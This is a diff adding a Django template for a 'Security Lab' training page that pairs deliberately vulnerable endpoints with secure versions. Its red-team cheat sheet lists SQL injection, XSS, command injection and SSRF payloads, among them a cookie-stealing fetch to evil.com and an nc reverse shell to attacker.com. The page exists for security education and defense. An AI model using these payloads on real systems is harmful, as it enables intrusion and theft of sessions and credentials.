@@ -1,0 +1,331 @@
+{% extends 'trading/base.html' %}
+{% block title %}Security Lab - TradeFlow{% endblock %}
+
+{% block content %}
+<div class="space-y-6">
+    <!-- Header -->
+    <div class="flex items-center justify-between">
+        <div>
+            <h1 class="text-3xl font-bold">🔐 Security Lab</h1>
+            <p class="text-zinc-400 mt-1">Practice offensive and defensive security techniques</p>
+        </div>
+        <div class="flex gap-3">
+            <span class="px-4 py-2 rounded-xl bg-red-500/10 text-red-400 border border-red-500/20 font-medium">
+                🔴 Red Team
+            </span>
+            <span class="px-4 py-2 rounded-xl bg-blue-500/10 text-blue-400 border border-blue-500/20 font-medium">
+                🔵 Blue Team
+            </span>
+        </div>
+    </div>
+
+    <!-- Warning Banner -->
+    <div class="bg-amber-500/10 border border-amber-500/30 rounded-2xl p-5">
+        <div class="flex items-start gap-4">
+            <span class="text-3xl">⚠️</span>
+            <div>
+                <h3 class="font-semibold text-amber-400">Educational Purpose Only</h3>
+                <p class="text-zinc-300 mt-1">
+                    This lab contains intentionally vulnerable code for learning purposes. 
+                    <strong>Never deploy vulnerable code to production.</strong> 
+                    Only practice on systems you own or have permission to test.
+                </p>
+            </div>
+        </div>
+    </div>
+
+    <!-- Stats -->
+    <div class="grid grid-cols-2 md:grid-cols-4 gap-4">
+        <div class="bg-zinc-900/50 border border-zinc-800 rounded-2xl p-5 text-center">
+            <p class="text-4xl font-bold text-red-400">10</p>
+            <p class="text-zinc-500 text-sm mt-1">Vulnerabilities</p>
+        </div>
+        <div class="bg-zinc-900/50 border border-zinc-800 rounded-2xl p-5 text-center">
+            <p class="text-4xl font-bold text-blue-400">10</p>
+            <p class="text-zinc-500 text-sm mt-1">Security Controls</p>
+        </div>
+        <div class="bg-zinc-900/50 border border-zinc-800 rounded-2xl p-5 text-center">
+            <p class="text-4xl font-bold text-emerald-400">OWASP</p>
+            <p class="text-zinc-500 text-sm mt-1">Top 10 2021</p>
+        </div>
+        <div class="bg-zinc-900/50 border border-zinc-800 rounded-2xl p-5 text-center">
+            <p class="text-4xl font-bold text-purple-400">HTB</p>
+            <p class="text-zinc-500 text-sm mt-1">Style Labs</p>
+        </div>
+    </div>
+
+    <!-- Vulnerability Cards -->
+    <div class="grid md:grid-cols-2 gap-5">
+        {% for vuln in vulnerabilities %}
+        <div class="bg-zinc-900/50 border border-zinc-800 rounded-2xl p-5 hover:border-zinc-700 transition-all">
+            <div class="flex items-start justify-between mb-4">
+                <div>
+                    <h3 class="text-lg font-semibold">{{ vuln.name }}</h3>
+                    <p class="text-zinc-500 text-sm">{{ vuln.owasp }}</p>
+                </div>
+                <span class="px-3 py-1 rounded-full text-xs font-medium 
+                    {% if vuln.severity == 'CRITICAL' %}bg-red-500/20 text-red-400 border border-red-500/30
+                    {% elif vuln.severity == 'HIGH' %}bg-orange-500/20 text-orange-400 border border-orange-500/30
+                    {% else %}bg-yellow-500/20 text-yellow-400 border border-yellow-500/30{% endif %}">
+                    {{ vuln.severity }}
+                </span>
+            </div>
+
+            <div class="space-y-3">
+                <!-- Vulnerable Endpoints -->
+                <div>
+                    <p class="text-red-400 text-xs font-medium uppercase tracking-wider mb-2">🔴 Vulnerable</p>
+                    <div class="space-y-1">
+                        {% for endpoint in vuln.endpoints %}
+                        <a href="{{ endpoint }}" target="_blank" 
+                           class="block px-3 py-2 bg-red-500/5 border border-red-500/10 rounded-lg text-sm font-mono hover:bg-red-500/10 transition-colors">
+                            {{ endpoint }}
+                        </a>
+                        {% endfor %}
+                    </div>
+                </div>
+
+                <!-- Secure Endpoints -->
+                <div>
+                    <p class="text-blue-400 text-xs font-medium uppercase tracking-wider mb-2">🔵 Secure</p>
+                    <div class="space-y-1">
+                        {% for endpoint in vuln.endpoints %}
+                        <a href="{{ endpoint|slice:'5:'|add:'/secure' }}" target="_blank"
+                           class="block px-3 py-2 bg-blue-500/5 border border-blue-500/10 rounded-lg text-sm font-mono hover:bg-blue-500/10 transition-colors">
+                            /secure{{ endpoint|slice:'5:' }}
+                        </a>
+                        {% endfor %}
+                    </div>
+                </div>
+            </div>
+        </div>
+        {% endfor %}
+    </div>
+
+    <!-- Attack Cheat Sheet -->
+    <div class="bg-zinc-900/50 border border-zinc-800 rounded-2xl p-6">
+        <h2 class="text-xl font-bold mb-5">🔴 Red Team Cheat Sheet</h2>
+        
+        <div class="grid md:grid-cols-2 gap-6">
+            <!-- SQL Injection -->
+            <div>
+                <h3 class="text-red-400 font-semibold mb-3">SQL Injection Payloads</h3>
+                <div class="space-y-2 font-mono text-sm">
+                    <div class="bg-zinc-800 rounded-lg p-3">
+                        <p class="text-zinc-400 text-xs mb-1"># Authentication Bypass</p>
+                        <code class="text-red-300">' OR '1'='1' --</code>
+                    </div>
+                    <div class="bg-zinc-800 rounded-lg p-3">
+                        <p class="text-zinc-400 text-xs mb-1"># Union-based extraction</p>
+                        <code class="text-red-300">' UNION SELECT username,password FROM users --</code>
+                    </div>
+                    <div class="bg-zinc-800 rounded-lg p-3">
+                        <p class="text-zinc-400 text-xs mb-1"># Error-based</p>
+                        <code class="text-red-300">' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables)) --</code>
+                    </div>
+                </div>
+            </div>
+
+            <!-- XSS -->
+            <div>
+                <h3 class="text-red-400 font-semibold mb-3">XSS Payloads</h3>
+                <div class="space-y-2 font-mono text-sm">
+                    <div class="bg-zinc-800 rounded-lg p-3">
+                        <p class="text-zinc-400 text-xs mb-1"># Basic alert</p>
+                        <code class="text-red-300">&lt;script&gt;alert('XSS')&lt;/script&gt;</code>
+                    </div>
+                    <div class="bg-zinc-800 rounded-lg p-3">
+                        <p class="text-zinc-400 text-xs mb-1"># Cookie stealing</p>
+                        <code class="text-red-300">&lt;img src=x onerror="fetch('http://evil.com?c='+document.cookie)"&gt;</code>
+                    </div>
+                    <div class="bg-zinc-800 rounded-lg p-3">
+                        <p class="text-zinc-400 text-xs mb-1"># Event handler</p>
+                        <code class="text-red-300">&lt;svg onload="alert(1)"&gt;</code>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Command Injection -->
+            <div>
+                <h3 class="text-red-400 font-semibold mb-3">Command Injection</h3>
+                <div class="space-y-2 font-mono text-sm">
+                    <div class="bg-zinc-800 rounded-lg p-3">
+                        <p class="text-zinc-400 text-xs mb-1"># Chain commands</p>
+                        <code class="text-red-300">; cat /etc/passwd</code>
+                    </div>
+                    <div class="bg-zinc-800 rounded-lg p-3">
+                        <p class="text-zinc-400 text-xs mb-1"># Command substitution</p>
+                        <code class="text-red-300">$(whoami)</code>
+                    </div>
+                    <div class="bg-zinc-800 rounded-lg p-3">
+                        <p class="text-zinc-400 text-xs mb-1"># Pipe output</p>
+                        <code class="text-red-300">| nc attacker.com 4444 -e /bin/sh</code>
+                    </div>
+                </div>
+            </div>
+
+            <!-- SSRF -->
+            <div>
+                <h3 class="text-red-400 font-semibold mb-3">SSRF Payloads</h3>
+                <div class="space-y-2 font-mono text-sm">
+                    <div class="bg-zinc-800 rounded-lg p-3">
+                        <p class="text-zinc-400 text-xs mb-1"># AWS metadata</p>
+                        <code class="text-red-300">http://169.254.169.254/latest/meta-data/</code>
+                    </div>
+                    <div class="bg-zinc-800 rounded-lg p-3">
+                        <p class="text-zinc-400 text-xs mb-1"># Internal service</p>
+                        <code class="text-red-300">http://localhost:6379/</code>
+                    </div>
+                    <div class="bg-zinc-800 rounded-lg p-3">
+                        <p class="text-zinc-400 text-xs mb-1"># File protocol</p>
+                        <code class="text-red-300">file:///etc/passwd</code>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Defense Cheat Sheet -->
+    <div class="bg-zinc-900/50 border border-zinc-800 rounded-2xl p-6">
+        <h2 class="text-xl font-bold mb-5">🔵 Blue Team Defense Guide</h2>
+        
+        <div class="grid md:grid-cols-2 gap-6">
+            <div>
+                <h3 class="text-blue-400 font-semibold mb-3">Prevention Controls</h3>
+                <div class="space-y-3">
+                    <div class="flex items-start gap-3 p-3 bg-blue-500/5 border border-blue-500/10 rounded-lg">
+                        <span class="text-blue-400 text-lg">🛡️</span>
+                        <div>
+                            <p class="font-medium">Parameterized Queries</p>
+                            <p class="text-zinc-500 text-sm">Prevent SQL injection with bound parameters</p>
+                        </div>
+                    </div>
+                    <div class="flex items-start gap-3 p-3 bg-blue-500/5 border border-blue-500/10 rounded-lg">
+                        <span class="text-blue-400 text-lg">🛡️</span>
+                        <div>
+                            <p class="font-medium">Output Encoding</p>
+                            <p class="text-zinc-500 text-sm">HTML escape all user-controlled output</p>
+                        </div>
+                    </div>
+                    <div class="flex items-start gap-3 p-3 bg-blue-500/5 border border-blue-500/10 rounded-lg">
+                        <span class="text-blue-400 text-lg">🛡️</span>
+                        <div>
+                            <p class="font-medium">Content-Security-Policy</p>
+                            <p class="text-zinc-500 text-sm">Restrict script execution sources</p>
+                        </div>
+                    </div>
+                    <div class="flex items-start gap-3 p-3 bg-blue-500/5 border border-blue-500/10 rounded-lg">
+                        <span class="text-blue-400 text-lg">🛡️</span>
+                        <div>
+                            <p class="font-medium">Authorization Checks</p>
+                            <p class="text-zinc-500 text-sm">Verify ownership before resource access</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+            <div>
+                <h3 class="text-blue-400 font-semibold mb-3">Detection & Monitoring</h3>
+                <div class="space-y-3">
+                    <div class="flex items-start gap-3 p-3 bg-blue-500/5 border border-blue-500/10 rounded-lg">
+                        <span class="text-blue-400 text-lg">📊</span>
+                        <div>
+                            <p class="font-medium">Security Logging</p>
+                            <p class="text-zinc-500 text-sm">Log authentication, authorization, errors</p>
+                        </div>
+                    </div>
+                    <div class="flex items-start gap-3 p-3 bg-blue-500/5 border border-blue-500/10 rounded-lg">
+                        <span class="text-blue-400 text-lg">📊</span>
+                        <div>
+                            <p class="font-medium">Rate Limiting</p>
+                            <p class="text-zinc-500 text-sm">Throttle requests to prevent brute force</p>
+                        </div>
+                    </div>
+                    <div class="flex items-start gap-3 p-3 bg-blue-500/5 border border-blue-500/10 rounded-lg">
+                        <span class="text-blue-400 text-lg">📊</span>
+                        <div>
+                            <p class="font-medium">WAF Rules</p>
+                            <p class="text-zinc-500 text-sm">Block known attack patterns</p>
+                        </div>
+                    </div>
+                    <div class="flex items-start gap-3 p-3 bg-blue-500/5 border border-blue-500/10 rounded-lg">
+                        <span class="text-blue-400 text-lg">📊</span>
+                        <div>
+                            <p class="font-medium">SIEM Integration</p>
+                            <p class="text-zinc-500 text-sm">Centralized log analysis and alerting</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Tools Section -->
+    <div class="bg-zinc-900/50 border border-zinc-800 rounded-2xl p-6">
+        <h2 class="text-xl font-bold mb-5">🛠️ Recommended Tools</h2>
+        
+        <div class="grid md:grid-cols-3 gap-4">
+            <div class="p-4 bg-zinc-800/50 rounded-xl">
+                <h3 class="font-semibold text-purple-400 mb-2">Burp Suite</h3>
+                <p class="text-zinc-500 text-sm">Web vulnerability scanner and proxy. Essential for testing.</p>
+            </div>
+            <div class="p-4 bg-zinc-800/50 rounded-xl">
+                <h3 class="font-semibold text-purple-400 mb-2">SQLMap</h3>
+                <p class="text-zinc-500 text-sm">Automated SQL injection detection and exploitation.</p>
+            </div>
+            <div class="p-4 bg-zinc-800/50 rounded-xl">
+                <h3 class="font-semibold text-purple-400 mb-2">OWASP ZAP</h3>
+                <p class="text-zinc-500 text-sm">Free alternative to Burp for security testing.</p>
+            </div>
+            <div class="p-4 bg-zinc-800/50 rounded-xl">
+                <h3 class="font-semibold text-purple-400 mb-2">Nmap</h3>
+                <p class="text-zinc-500 text-sm">Network discovery and security auditing.</p>
+            </div>
+            <div class="p-4 bg-zinc-800/50 rounded-xl">
+                <h3 class="font-semibold text-purple-400 mb-2">Wireshark</h3>
+                <p class="text-zinc-500 text-sm">Network protocol analyzer for traffic inspection.</p>
+            </div>
+            <div class="p-4 bg-zinc-800/50 rounded-xl">
+                <h3 class="font-semibold text-purple-400 mb-2">Metasploit</h3>
+                <p class="text-zinc-500 text-sm">Penetration testing framework.</p>
+            </div>
+        </div>
+    </div>
+
+    <!-- Learning Path -->
+    <div class="bg-gradient-to-br from-purple-500/10 to-pink-500/10 border border-purple-500/20 rounded-2xl p-6">
+        <h2 class="text-xl font-bold mb-5">📚 Your Learning Path</h2>
+        
+        <div class="grid md:grid-cols-4 gap-4">
+            <div class="text-center p-4">
+                <div class="w-12 h-12 rounded-full bg-emerald-500/20 text-emerald-400 flex items-center justify-center mx-auto text-xl font-bold mb-3">1</div>
+                <h3 class="font-semibold">Understand</h3>
+                <p class="text-zinc-500 text-sm mt-1">Read the vulnerable code and understand why it's insecure</p>
+            </div>
+            <div class="text-center p-4">
+                <div class="w-12 h-12 rounded-full bg-red-500/20 text-red-400 flex items-center justify-center mx-auto text-xl font-bold mb-3">2</div>
+                <h3 class="font-semibold">Attack</h3>
+                <p class="text-zinc-500 text-sm mt-1">Exploit the vulnerabilities using the techniques above</p>
+            </div>
+            <div class="text-center p-4">
+                <div class="w-12 h-12 rounded-full bg-blue-500/20 text-blue-400 flex items-center justify-center mx-auto text-xl font-bold mb-3">3</div>
+                <h3 class="font-semibold">Defend</h3>
+                <p class="text-zinc-500 text-sm mt-1">Study the secure version and implement fixes</p>
+            </div>
+            <div class="text-center p-4">
+                <div class="w-12 h-12 rounded-full bg-purple-500/20 text-purple-400 flex items-center justify-center mx-auto text-xl font-bold mb-3">4</div>
+                <h3 class="font-semibold">Detect</h3>
+                <p class="text-zinc-500 text-sm mt-1">Write detection rules and monitor for attacks</p>
+            </div>
+        </div>
+    </div>
+</div>
+{% endblock %}
+
+{% block extra_js %}
+<script>
+    // Update footer
+    document.getElementById('footer-balance').textContent = 'Security Lab';
+    document.getElementById('footer-holdings').textContent = 'Practice Mode';
+</script>
+{% endblock %}
